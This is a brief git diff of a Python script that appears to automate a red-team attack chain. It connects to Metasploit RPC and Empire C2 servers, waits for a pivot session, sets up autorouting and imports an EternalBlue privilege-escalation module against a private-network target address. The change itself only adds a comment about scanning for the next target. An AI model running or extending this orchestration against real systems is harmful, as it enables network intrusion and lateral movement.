@@ -16,11 +16,10 @@ from stage2.external_c2 import msf_wait_for_session, empire_wait_for_agent
 from stage3.internal_c2.windows import msf_autoroute
 from stage3.escalate_privilege.windows import msf_eternal_blue
 
-
 # Set both API instances for MSF & Empire
 client = MsfRpcClient(MSF_PWD, server=MSF_SERVER,ssl=False)
 API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
-target_address = '192.168.181.196'
+target_address = '192.168.181.196' # by right, should do a scan to get next target
 
 # Step 1 - Wait for pivot
 msf_session_id = msf_wait_for_session.run(client)
